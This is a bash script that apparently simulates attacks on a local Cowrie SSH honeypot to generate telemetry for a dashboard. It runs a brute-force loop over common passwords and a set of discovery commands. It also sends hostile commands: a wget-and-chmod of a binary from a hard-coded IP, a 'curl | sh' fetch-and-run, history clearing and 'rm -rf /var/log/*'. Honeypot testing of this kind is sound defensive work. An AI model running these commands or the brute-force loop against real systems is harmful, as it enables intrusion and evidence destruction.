#!/usr/bin/env bash
# ==============================================================================
# Script: simulate_attack.sh
# Purpose: Automated Adversary Simulation & Telemetry Generation
# Target: Cowrie SSH Honeypot (Default: 127.0.0.1:2222)
# Capabilities:
#   - Automated brute-force credential spraying (generates cowrie.login.failed)
#   - Successful authentication via seeded credentials (generates cowrie.login.success)
#   - Interactive discovery commands (generates cowrie.command.input & MITRE tags)
#   - Malware dropper simulation (generates cowrie.session.file_download)
# ==============================================================================

set -euo pipefail

TARGET_HOST="${1:-127.0.0.1}"
TARGET_PORT="${2:-2222}"

echo "[*] Initializing automated attack simulation against ${TARGET_HOST}:${TARGET_PORT}..."

# Check prerequisites
if ! command -v sshpass &> /dev/null; then
    echo "[!] sshpass not found. Attempting installation..."
    if command -v apt-get &> /dev/null; then
        sudo apt-get update -y && sudo apt-get install -y sshpass
    else
        echo "[!] Please install sshpass manually to run automated simulations."
        exit 1
    fi
fi

SSH_OPTS="-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o LogLevel=ERROR -o ConnectTimeout=5 -p ${TARGET_PORT}"

# Stage 1: Brute-Force Password Spraying (Failed Logins)
echo "[+] Stage 1: Simulating credential brute-force attacks (T1110.001)..."

USERS=("root" "admin" "ubuntu" "support" "oracle" "postgres" "guest")
PASSWORDS=("123456" "password" "admin" "toor" "qwerty" "letmein" "welcome1")

for user in "${USERS[@]}"; do
    for pass in "${PASSWORDS[@]}"; do
        sshpass -p "${pass}" ssh ${SSH_OPTS} "${user}@${TARGET_HOST}" "exit" 2>/dev/null || true
        sleep 0.1
    done
done
echo "[+] Stage 1 complete. Generated $((${#USERS[@]} * ${#PASSWORDS[@]})) brute-force telemetry events."

# Stage 2: Successful Authentication & Post-Exploitation Discovery
echo "[+] Stage 2: Simulating valid account compromise & discovery commands (T1078, T1082, T1033)..."

COMMANDS=(
    "uname -a"
    "cat /proc/cpuinfo"
    "cat /etc/issue"
    "id"
    "whoami"
    "w"
    "ifconfig"
    "ip addr"
    "netstat -tuln"
    "ps aux"
    "free -m"
    "ls -la /tmp"
)

# Execute interactive session as root:root (seeded in config/userdb.txt)
for cmd in "${COMMANDS[@]}"; do
    sshpass -p "root" ssh ${SSH_OPTS} "root@${TARGET_HOST}" "${cmd}" 2>/dev/null || true
    sleep 0.2
done
echo "[+] Stage 2 complete. Executed ${#COMMANDS[@]} discovery commands."

# Stage 3: Ingress Tool Transfer & Anti-Forensics Simulation
echo "[+] Stage 3: Simulating malware staging and anti-forensics (T1105, T1070.004)..."

STAGING_COMMANDS=(
    "wget http://194.26.29.112/bins/arm7 -O /tmp/.arm && chmod +x /tmp/.arm"
    "curl -s http://185.156.73.45/init.sh | sh"
    "history -c"
    "rm -rf /var/log/*"
)

for cmd in "${STAGING_COMMANDS[@]}"; do
    sshpass -p "admin123" ssh ${SSH_OPTS} "admin@${TARGET_HOST}" "${cmd}" 2>/dev/null || true
    sleep 0.2
done
echo "[+] Stage 3 complete. Executed staging and anti-forensics simulations."

echo "[*] Attack simulation completed successfully."
echo "[*] You can now inspect telemetry using:"
echo "    python scripts/parse_logs.py --input data/logs/cowrie.json"
echo "    streamlit run dashboards/app.py"
